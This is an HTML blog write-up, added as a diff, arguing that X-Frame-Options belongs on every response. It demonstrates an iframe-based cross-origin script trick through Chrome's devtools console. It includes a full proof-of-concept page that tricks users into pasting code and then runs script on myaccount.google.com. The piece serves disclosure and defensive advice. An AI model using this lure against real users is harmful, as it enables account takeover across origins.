@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+	<title>Why XFO header should be applied to every response - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+<div id="qWriteup">
+<h1>Why XFO header should be applied to every response</h1>
+<br>
+The X-Frame-Options (XFO) header is widely used to prevent clickjacking attacks.
+ It makes sense not to let arbitrary websites embed sensitive external websites with full credentials, since you can trick users into performing actions in what they percieve to be within the attackers website, except in reality they are interacting with their facebook account for example.<br>
+ Because of this, most websites send a XFO header on sensitive parts of websites where clickjacking is a possibility, not all. Usually the (favicon.ico) file and 404 pages are forgotten. But is this good practice? Are there other risks?<br>
+ <br>
+ If a website forgets to send an XFO header in a useless 404 page, is that bad? Well, yes and no. If your goal is to prevent clickjacking then sure, you have prevented that. But are there other theoretical risks? Yes!
+ <br>
+ <br>
+ Since I have been focusing on browser security, I realized that a lot of exploits come out every month. I will be focusing on a single type of vulnerability with certain conditions/restrictions.
+ <h2>Universal XSS / Same origin policy bypass</h2>
+ 
+ The uXSS is a bug where you can run javascript on any cross origin website. So, ordinarily you can't be within 'a.com' and execute JS code on 'b.com' but with a uXSS bug you can.<br>
+ Now, there are many different exploits that use many different ways, but I will be focusing on the ones that rely on gaining a reference to a cross-origin website.
+ <br>
+ <br>
+ The main two ways to gain a reference to a cross-origin website are: <br>
+	1. Using the open() JS function. This function will open a website and return a reference to it.<br>
+	2. Have an iframe point to a cross origin website (that doesnt serve XFO header) and then this[0] will contain the reference to the cross origin object.<br>
+<br>
+We will be focusing on (2), specifically, uXSS exploits that work by manipulating iframes (which means they rely on iframes). I have seen many uXSS bugs that (for some reason) only work on iframes and so I had to ask myself, what can be done if we had such an exploit?
+<br> I initially thought iframe based uXSS would be useless, since most if not all juicy websites (facebook, twitter and all) could'nt be included in an iframe to begin with. And even if I can include a favicon.ico file, so what? Can we do anything useful?
+<br>
+Well, after much thought, I think there is a danger. 
+<h2>The Google Chrome '0day'</h2>
+I will be using an unreported 'uXSS' in order to prove this concept. I did not bother to report this since it is high in user interaction + probably 'working as intended.'<br>
+You may or may not be aware that the Google Chrome web console has the ability to change contexts by default, when you open it it will be pointed to the TOP context, meaning the main window. But, you can also change the context to any sub frames.<br>
+Say you have a page that contains a random iframe pointing to a random framable website, you should see the following in your web console.<br>
+<br>
+<img src="./pic.png"/>
+<br>
+The only indication that you are within another context other than TOP is that the drop down menu turns red. I don't think this is something most will take as a problem, so already we see the exploitability here. But are we to expect a user to be convinced into switching contexts? No.
+<br> If a user right clicks and 'inspects element' of an iframe, the console will be automatically within the iframes context. You may have also noticed the sub frame I have in the screenshot above is 'top (thing)' and under it 'myaccount.google.com'<br>
+'top' is actually the ID of the iframe (I named it TOP in order to look like its the top frame/context), 'thing' is the remote file being accessed and finally the origin under it is not displayed on the main dropdown menu so we can ignore that.
+<br>
+So our Google Chrome exploit will work as follows:<br>
+1.  Visit attacker page & copy some code.<br>
+2.  Right click anywhere and attempt to 'inspect element'<br>
+3. 	Go to 'Console' and paste said code and execute.<br>
+4. JS code is executed within cross-origin website.<br>
+
+<h2>Escalation</h2>
+
+Now that we have an 'exploit' to play with, let's think about what can be done with this? Reading 'document.cookie' is outdated and boring. We want to be able to touch the juicy, XFO'd pages.<br>
+The only way I can think of is to open up a reference to a juicier page and then have the iframe mess with it. Since they both are same origin it will be legitimate. Please note that even if the website has XFO header with 'sameorigin' it will check the most top frame, so we cant just put another iframe within the iframe.<br>
+
+<br>
+Here is the full proof of concept, follow each step and you should see the magic happen. Keep in mind this code will only work on 'localhost' to prevent abuse.<br>
+If you ever wonder how something is done, just read the code. If reading the code doesn't help please DM me on twitter @qab.
+<br>
+<br>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;title&gt;</span>roboto<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;style&gt;</span>
+<span style="color: #000080; font-weight: bold">iframe</span>{
+	<span style="color: #000080; font-weight: bold">border</span>:<span style="color: #0000FF">0px</span> <span style="color: #000080; font-weight: bold">solid</span> red;
+	
+	<span style="color: #000080; font-weight: bold">width</span>:<span style="color: #0000FF">1000px</span>;
+	<span style="color: #000080; font-weight: bold">height</span>:<span style="color: #0000FF">400px</span>;
+	<span style="color: #000080; font-weight: bold">position</span>:<span style="color: #000080; font-weight: bold">absolute</span>;
+	<span style="color: #000080; font-weight: bold">left</span>:-<span style="color: #0000FF">400px</span>;
+	
+}
+
+#q{
+	<span style="color: #000080; font-weight: bold">z-index</span>:<span style="color: #0000FF">1000</span>;
+	<span style="color: #000080; font-weight: bold">position</span>:<span style="color: #000080; font-weight: bold">absolute</span>;
+	<span style="color: #000080; font-weight: bold">top</span>:<span style="color: #0000FF">200px</span>;
+
+	<span style="color: #000080; font-weight: bold">background-color</span>:white;
+	<span style="color: #000080; font-weight: bold">display</span>:<span style="color: #000080; font-weight: bold">block</span>;
+	<span style="color: #000080; font-weight: bold">height</span>:<span style="color: #0000FF">200px</span>;
+	<span style="color: #000080; font-weight: bold">width</span>:<span style="color: #0000FF">200px</span>;
+}
+<span style="color: #000080; font-weight: bold">&lt;/style&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;div</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;q&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>Right click and inspect <span style="color: #000080; font-weight: bold">&lt;br&gt;</span>the broken robot to fix him!<span style="color: #000080; font-weight: bold">&lt;/div&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;iframe</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;top&quot;</span>  <span style="color: #FF0000">src=</span><span style="color: #0000FF">&quot;http://innocent.iframe/hello!&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/iframe&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+
+<span style="color: #000080; font-weight: bold">this</span>[<span style="color: #0000FF">0</span>].location=<span style="color: #0000FF">&#39;https://myaccount.google.com/roboto#var z;document.write(&quot;&lt;button id=q&gt;Roboto has been saved! click here to claim your prize&lt;/button&gt;&quot;);top.postMessage(&quot;a&quot;, &quot;http://localhost/&quot;);q.onclick=function(){z=open(&quot;/&quot;);setTimeout(function(){z.document.write(&quot;@qab&quot;);},1500);};&#39;</span>;
+
+window.onresize=<span style="color: #000080; font-weight: bold">function</span>(){
+console.clear();
+q.innerHTML=<span style="color: #0000FF">&#39;Save Mr.Roboto by copy pasting the following into his console.&lt;br&gt;&lt;textarea&gt;&#39;</span>+<span style="color: #a61717; background-color: #e3d2d2">`</span>Function(location.hash.split(<span style="color: #0000FF">&#39;#&#39;</span>)[<span style="color: #0000FF">1</span>])()<span style="color: #a61717; background-color: #e3d2d2">`</span>+<span style="color: #0000FF">&#39;&lt;/textarea&gt;&#39;</span>;
+console.log(<span style="color: #0000FF">&#39;%c Paste code here to save Mr.Roboto! (press CTRL+V to paste)&#39;</span>, <span style="color: #0000FF">&#39;color: red; font-size:25px;&#39;</span>);
+console.log(<span style="color: #0000FF">&#39;%c The code: &#39;</span>+<span style="color: #a61717; background-color: #e3d2d2">`</span>Function(location.hash.split(<span style="color: #0000FF">&#39;#&#39;</span>)[<span style="color: #0000FF">1</span>])()<span style="color: #a61717; background-color: #e3d2d2">`</span>, <span style="color: #0000FF">&#39;color: red; font-size:15px;&#39;</span>);
+
+window.onresize=<span style="color: #000080; font-weight: bold">null</span>;
+}
+
+window.addEventListener(<span style="color: #0000FF">&quot;message&quot;</span>, receiveMessage, <span style="color: #000080; font-weight: bold">false</span>);
+
+<span style="color: #000080; font-weight: bold">function</span> receiveMessage(event)
+{
+q.remove();
+  document.getElementById(<span style="color: #0000FF">&#39;top&#39;</span>).style.setProperty(<span style="color: #0000FF">&#39;left&#39;</span>,<span style="color: #0000FF">&#39;0px&#39;</span>);
+}
+
+<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+
+<h2>Conclusions</h2>
+
+Any and all responses coming from your server should have an appropriate XFO header.
+</div>
+
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
